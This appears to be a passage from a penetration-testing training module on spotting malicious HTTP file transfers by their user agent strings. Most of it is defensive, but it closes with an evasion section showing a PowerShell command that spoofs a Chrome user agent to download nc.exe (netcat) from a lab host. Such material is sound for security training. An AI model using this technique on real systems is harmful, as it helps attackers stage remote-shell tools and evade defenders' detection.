Command-line detection based on blacklisting is straightforward to bypass, even using simple case obfuscation. However, although the process of whitelisting all command lines in a particular environment is initially time-consuming, it is very robust and allows for quick detection and alerting on any unusual command lines.

Most client-server protocols require the client and server to negotiate how content will be delivered before exchanging information. This is common with the `HTTP` protocol. There is a need for interoperability amongst different web servers and web browser types to ensure that users have the same experience no matter their browser. HTTP clients are most readily recognized by their user agent string, which the server uses to identify which `HTTP` client is connecting to it, for example, Firefox, Chrome, etc.

User agents are not only used to identify web browsers, but anything acting as an `HTTP` client and connecting to a web server via `HTTP` can have a user agent string (i.e., `cURL`, a custom `Python` script, or common tools such as `sqlmap`, or `Nmap`).

Organizations can take some steps to identify potential user agent strings by first building a list of known legitimate user agent strings, user agents used by default operating system processes, common user agents used by update services such as Windows Update, and antivirus updates, etc. These can be fed into a SIEM tool used for threat hunting to filter out legitimate traffic and focus on anomalies that may indicate suspicious behavior. Any suspicious-looking user agent strings can then be further investigated to determine whether they were used to perform malicious actions. This [website](http://useragentstring.com/index.php) is handy for identifying common user agent strings. A list of user agent strings is available [here](http://useragentstring.com/pages/useragentstring.php).

Malicious file transfers can also be detected by their user agents. The following user agents/headers were observed from common `HTTP` transfer techniques (tested on Windows 10, version 10.0.14393, with PowerShell 5).

# Evading Detection

If diligent administrators or defenders have blacklisted any of these User Agents, [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.1) contains a UserAgent parameter, which allows for changing the default user agent to one emulating Internet Explorer, Firefox, Chrome, Opera, or Safari. For example, if Chrome is used internally, setting this User Agent may make the request seem legitimate.

Invoking Invoke-WebRequest to download nc.exe using a Chrome User Agent:

#### Request with Chrome User Agent
```powershell-session
PS C:\htb> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```
